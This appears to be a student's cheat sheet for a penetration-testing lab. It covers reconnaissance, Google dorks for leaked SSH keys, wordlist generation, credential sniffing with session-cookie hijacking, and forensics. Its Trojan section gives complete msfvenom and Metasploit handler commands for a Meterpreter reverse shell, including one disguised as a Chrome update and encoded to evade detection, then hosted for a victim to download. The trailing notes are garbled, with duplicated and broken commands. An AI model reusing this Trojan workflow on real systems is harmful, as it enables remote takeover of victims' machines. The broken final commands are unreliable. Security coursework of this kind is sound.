Here is your ultimate, fully separated master cheat sheet for the VAPT lab. Every practical is broken down exactly as requested: Theory, Procedure, and Conclusion. 

---

### **Practical 2: Passive Reconnaissance**
**1) Theory:**
Passive reconnaissance is the first phase of a cybersecurity assessment where information about a target is collected without sending direct packets to the target system. It relies on public databases, DNS records, search engines, and OSINT (Open Source Intelligence) to maintain stealth.

**2) Procedure (Commands):**
* **WHOIS:** Find domain registrar and owner details.
    * `whois youtube.com`
* **NSLOOKUP:** Query DNS for specific records (like Mail Servers).
    * `nslookup -type=mx netflix.com`
* **DIG:** Perform advanced DNS lookups.
    * `dig netflix.com MX` (Mail Exchange)
    * `dig netflix.com NS` (Name Servers)
    * `dig netflix.com TXT` (Text records)
* **theHarvester:** Scrape OSINT data for emails and subdomains.
    * `theHarvester -d netflix.com -l 100 -b duckduckgo`
* **Shodan:** Search for exposed internet-connected devices via browser.

**3) Conclusion:**
This experiment demonstrates how passive reconnaissance can reveal sensitive infrastructure details (like mail servers and open ports) simply by leveraging publicly exposed information, minimizing the risk of detection.

---

### **Practical 3: Google Dorking**
**1) Theory:**
Google Dorking (or Google Hacking) is a passive reconnaissance technique that uses advanced search operators to uncover sensitive information indexed by search engines. It exposes misconfigured web resources, backup files, and unprotected directories without actively hacking the server.

**2) Procedure (Commands):**
Execute these queries in a standard Google search bar:
* **Find Exposed Keys:** `site:github.com "BEGIN OPENSSH PRIVATE KEY"`
* **Find Login Portals:** `intitle:"SSL Network Extender Login" -checkpoint.com`
* **Find Admin Panels:** `site:example.com inurl:admin`
* **Find Specific File Types:** * `site:ves.ac.in ext:doc`
    * `site:example.com ext:sql`

**3) Conclusion:**
Google Dorking proves that organizational negligence regarding web permissions and `robots.txt` configurations can unintentionally expose high-risk assets (like SSH keys and database backups) to the public internet.

---

### **Practical 4: Active Reconnaissance**
**1) Theory:**
Active reconnaissance involves directly interacting with the target system by sending packets to identify live hosts, open ports, running services, and operating systems. Unlike passive recon, this generates network traffic and can be detected by Firewalls or Intrusion Detection Systems (IDS).

**2) Procedure (Commands):**
* **Ping / Connectivity:** `ping vesit.ves.ac.in` (Use `Ctrl+C` to stop)
* **Nmap Scans:**
    * `nmap -sn vesit.ves.ac.in` (Host discovery / Ping scan)
    * `nmap -sT vesit.ves.ac.in` (TCP Connect scan)
    * `nmap -sS vesit.ves.ac.in` (Stealth SYN scan)
    * `nmap -sU vesit.ves.ac.in` (UDP scan)
    * `nmap -sV vesit.ves.ac.in` (Service version detection)
    * `nmap -O vesit.ves.ac.in` (OS detection)
* **Banner Grabbing & Fingerprinting:**
    * `nc vesit.ves.ac.in 80` (Type `GET / HTTP/1.1` and press Enter twice)
    * `telnet vesit.ves.ac.in 21`
* **Web Scans:**
    * `whatweb http://vesit.ves.ac.in`
    * `nikto -h http://vesit.ves.ac.in`

**3) Conclusion:**
Active reconnaissance provides a precise and real-time profile of the target's attack surface. Documenting specific service versions and open ports forms the critical foundation for the vulnerability exploitation phase.

---

### **Practical 5: Angry IP Scanner**
**1) Theory:**
Angry IP Scanner is a fast, GUI-based network scanner that uses multi-threading to ping IP addresses and resolve hostnames, MAC addresses, and open ports across a local subnet.

**2) Procedure:**
* Open Angry IP Scanner.
* Enter the target IP address range (e.g., your local lab network).
* Go to Preferences/Fetchers and specify the target ports: `80, 443, 21, 22`.
* Click **Start**.
* Observe the live hosts (marked in blue/green) and note their open ports and response times.

**3) Conclusion:**
This tool rapidly maps out active devices on a local network, identifying potential targets and their externally facing services with minimal manual effort.

---

### **Practical 7 & 10: Wordlist Generation (Crunch)**
**1) Theory:**
Crunch is a utility used to dynamically generate custom wordlists and dictionaries. Attackers use these wordlists to perform brute-force or dictionary attacks against password hashes or login portals, especially when the target's password policy or naming conventions are known.

**2) Procedure (Commands):**
* **Install:** `sudo apt update && sudo apt install crunch`
* **Generate by Length:** `crunch 1 2 -o wordlist.txt` (All 1-2 char combinations)
* **Generate by Pattern:** `crunch 6 6 -o rahul.txt -t ABC123` (`-t` forces a pattern)
* **Generate with Custom Strings:** `crunch 1 2 vesit@123 -o START -b 3mb`
* **Generate with Charset:** `crunch 2 2 abcdefghijklmnopqrstuvwxyz -o wordlist.txt`

**3) Conclusion:**
Custom wordlist generation significantly speeds up brute-force attacks by narrowing down the guesswork based on known user behaviors, emphasizing the need for complex, unpredictable passwords.

---

### **Practical 8: Network Sniffing & Session Hijacking (Wireshark)**
**1) Theory:**
Network sniffing involves intercepting data packets traveling across a network. If the traffic is unencrypted (like HTTP), attackers can easily read sensitive information such as usernames, passwords, and session cookies, leading to session hijacking.

**2) Procedure:**
* Open Wireshark, select your network interface, and click **Start Capturing**.
* Apply the filter: `http` or `ip.addr == <target_IP>`.
* Open a browser and navigate to a vulnerable HTTP site (e.g., `testphp.vulnweb.com`).
* Enter test credentials and click login.
* Stop the Wireshark capture.
* Go to **Edit -> Find Packet -> String** and search for the username you entered.
* Locate the **HTTP POST** request. Right-click -> **Follow TCP Stream** to view the plaintext credentials.
* To hijack: Copy the `PHPSESSID` cookie from the headers, inject it into a cookie editor extension in your browser, and refresh the page to bypass the login screen.

**3) Conclusion:**
This experiment highlights the critical vulnerability of unencrypted HTTP traffic. Anyone on the local network can capture plaintext credentials and hijack active user sessions.

---

### **Practical 8 (Forensics): Disk Imaging (FTK Imager)**
**1) Theory:**
Digital forensics requires analyzing evidence without modifying the original data. FTK Imager creates a bit-by-bit, read-only replica (image) of a physical drive. The standard format is `.E01`, which includes embedded metadata and cryptographic hashes.

**2) Procedure:**
* Launch FTK Imager.
* Navigate to **File -> Create Disk Image**.
* Select Source Type as **Image File** (or Physical Drive).
* Select Image Format as **E01** (Recommended).
* Choose the Output Folder and ensure **Verify images after they are created** is checked.
* Observe the generation of Hash Values (MD5/SHA1) and File Metadata.

**3) Conclusion:**
Creating a verified `.E01` disk image ensures strict data integrity and a proper chain of custody, allowing forensic investigators to analyze the system state without tampering with the original drive.

---

### **Practical 9: Digital Forensics (Autopsy)**
**1) Theory:**
Autopsy is a digital forensics platform used to analyze disk images. It processes the raw data to recover deleted files, extract web artifacts (like browser history and cookies), and build timelines of user activity.

**2) Procedure:**
* Launch Autopsy (Run as Administrator).
* Click **Create New Case** and set up the case details.
* Select **Add Data Source** -> **Disk Image**, then browse and select the `.E01` image created in FTK Imager.
* Enable Ingest Modules: File Type Identification, Keyword Search, Hash Lookup, Web Artifacts, Email Parser, Recent Activity, and Timeline.
* Click Finish to start processing.
* **Observe:** Navigate the left panel to view **Deleted Files**, review the Timeline analysis, and generate a final report.

**3) Conclusion:**
Autopsy demonstrates that simply deleting a file or clearing browser history does not remove the data from a hard drive. Forensic tools can easily reconstruct past user activity and recover hidden artifacts.

---

### **Practical 11: HTTP vs HTTPS Capture (Wireshark)**
**1) Theory:**
HTTP transmits data in plaintext, while HTTPS encrypts data using TLS/SSL before transmission. Sniffing HTTPS traffic will only yield unreadable, encrypted application data, protecting it from man-in-the-middle attacks.

**2) Procedure:**
* Start a Wireshark capture.
* Browse an HTTP website, submit fake login details, and stop the capture.
* Observe the HTTP packet and find the plaintext credentials (as done in Exp 8).
* Start a new Wireshark capture.
* Browse an **HTTPS** website, submit fake login details, and stop the capture.
* Search for the traffic (look for TLSv1.2 or TLSv1.3). 
* **Observe:** The application data payload is encrypted and the credentials cannot be read.

**3) Conclusion:**
The stark contrast between readable HTTP packets and encrypted HTTPS packets proves that SSL/TLS encryption is an absolute necessity for securing sensitive data in transit.

---

### **Practical 12: Creation of a Trojan (Metasploit)**
**1) Theory:**
A Trojan is malicious software disguised as a legitimate application. Attackers use frameworks like Metasploit to generate a payload (like a reverse shell) and embed it inside a normal executable. Once run by the victim, it connects back to the attacker, bypassing inbound firewall rules.

**2) Procedure (Commands):**
* **Install & Init:**
    * `sudo apt install metasploit-framework`
    * `sudo msfdb init`
* **Generate Payload (Attacker Terminal):**
    * Find your IP (`ifconfig`).
    * `msfvenom --payload windows/meterpreter/reverse_tcp --arch x86 --format exe LHOST=<Your_IP> LPORT=4444 > windowsMeterpreter.exe`
    * *(Optional - Embedded Payload):* `msfvenom -p windows/meterpreter/reverse_tcp -x /path/to/ChromeUpdate.exe -e x86/shikata_ga_nai -i 500 LHOST=<Your_IP> LPORT=4444 -f exe > Update.exe`
* **Set up Listener (Attacker Terminal):**
    * `msfconsole`
    * `use exploit/multi/handler`
    * `set payload windows/meterpreter/reverse_tcp`
    * `set LHOST <Your_IP>`
    * `set LPORT 4444`
    * `exploit` (or `run`)

**3) Conclusion:**
This practical illustrates the severe danger of executing untrusted files. By utilizing a reverse TCP payload disguised as a trusted app, an attacker can effortlessly gain full, interactive remote control (Meterpreter shell) over the target machine.

### Exatra 
VAPT Exp 12


# Generate the malicious executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.116 LPORT=4444 -f exe -o Lab9_Final.exe

# Move it to the Desktop for easy access
mv ~/Lab9_Final.exe ~/Desktop/

# Navigate to the file location and host it
cd ~/Desktop
sudo python3 -m http.server 80

Then on another terminal 
# Launch Metasploit
msfconsole

# Configure the multi-handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.0.116
set LPORT 4444

# Start listening
exploit
                       
On victim pc 
Search http://192.168.0.116/Lab9_Final.exe
With all closed 

# Check system and user info
sysinfo
getuid

# Visual Proof
screenshot

# Enter Windows Command Line
shell

# Remote Actions (Inside the Shell)
start https://www.google.com
start https://www.youtube.com/results?search_query=hai+apna+dil+toh+aawara

# Return to Meterpreter
exit 

# reloaded
sudo apt install metasploit-framework
sudo msfdb init
msfconsole
db_status
search platform:windows

msfvenom --payload windows/meterpreter/reverse_tcp \ --arch x86 --format exe \ 
LHOST=192.168.38.134 LPORT=4444 > windowsMterpreter.exe

msfconsole
use multi/handler
set payload window/meterpreter/reverse_tcp
msfconsole
use exploit/multi/handler
er/reverse_tcp
set LHOST 10.0.2.15
set LPORT 4444
show options